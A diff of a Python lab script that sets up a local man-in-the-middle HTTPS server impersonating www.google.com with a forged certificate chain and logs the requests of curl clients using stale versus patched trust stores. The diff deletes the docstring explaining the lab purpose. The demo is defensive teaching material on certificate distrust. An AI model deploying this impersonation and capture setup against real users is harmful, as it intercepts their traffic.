@@ -1,33 +1,10 @@
 #!/usr/bin/env python3
-"""
-Step 3 -- The MITM: same forged cert, two different trust stores.
-
-The "attacker" runs an HTTPS endpoint that impersonates www.google.com using
-the forged certificate chain (leaf signed by the weak-key intermediate).
-
-Two "victims" connect to it (curl resolves www.google.com to 127.0.0.1 in
-this lab):
-
-  * STALE victim   -- frozen ca-bundle that still contains the emSign-like
-                      root + intermediate, and (like most embedded software)
-                      performs NO revocation checking.
-                      Result: the forged chain validates. The attacker
-                      decrypts and logs the victim's traffic.
-
-  * PATCHED victim -- updated bundle where the emSign-like root was removed
-                      (the OneCRL / NSS 3.131.1 / distro-bundle behavior).
-                      Result: handshake fails. The attacker logs nothing.
-
-Run: python3 mitm_demo.py
-"""
-
 import http.server
 import os
 import ssl
 import subprocess
 import sys
 import threading
-import time
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 TRUST = os.path.join(HERE, "..", "trust")
@@ -40,11 +17,16 @@ HOST, PORT = "127.0.0.1", 8443
 VICTIM_DOMAIN = "www.google.com"
 
 captured = []
+CURL_TLS_ERROR_MARKERS = (
+    "curl: (35)",
+    "curl: (60)",
+    "tls alert",
+    "certificate verify failed",
+    "ssl certificate problem",
+)
 
 
 class AttackerHandler(http.server.BaseHTTPRequestHandler):
-    """The MITM endpoint: logs everything the victim sends."""
-
     def do_GET(self):
         captured.append(self.requestline + "\n" + str(self.headers))
         body = (
@@ -64,10 +46,9 @@ class AttackerHandler(http.server.BaseHTTPRequestHandler):
 
 
 def curl_victim(bundle_path, label):
-    """Run the victim client against the attacker with the given trust store."""
     cmd = [
         "curl",
-        "-s",
+        "-sS",
         "-o", "/dev/null",
         "-w", "%{http_code}",
         "--resolve", f"{VICTIM_DOMAIN}:{PORT}:127.0.0.1",
@@ -84,16 +65,22 @@ def curl_victim(bundle_path, label):
     if ok:
         print(f"    HTTP status    : {proc.stdout}")
     else:
-        # Keep only the human-meaningful part of curl's TLS error
-        err = [l for l in proc.stderr.splitlines() if "error" in l.lower() or "alert" in l.lower() or "certificate" in l.lower()]
-        tail = proc.stderr.strip().splitlines() if proc.stderr.strip() else []
-        print("    TLS outcome    : " + (err[0].strip() if err else (tail[-1] if tail else "handshake rejected (no stderr detail)")))
+        print("    TLS outcome    : " + first_tls_error(proc.stderr))
     return ok
+
+
+def first_tls_error(stderr):
+    lines = [line.strip() for line in stderr.splitlines() if line.strip()]
+    for line in lines:
+        lowered = line.lower()
+        if any(marker in lowered for marker in CURL_TLS_ERROR_MARKERS):
+            return line
+    return lines[-1] if lines else "handshake rejected (curl returned no error detail)"
 
 
 def main():
     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-    ctx.load_cert_chain(LEAF_CHAIN, LEAF_KEY)  # serves leaf + intermediate chain
+    ctx.load_cert_chain(LEAF_CHAIN, LEAF_KEY)
 
     server = http.server.HTTPServer((HOST, PORT), AttackerHandler)
     server.socket = ctx.wrap_socket(server.socket, server_side=True)
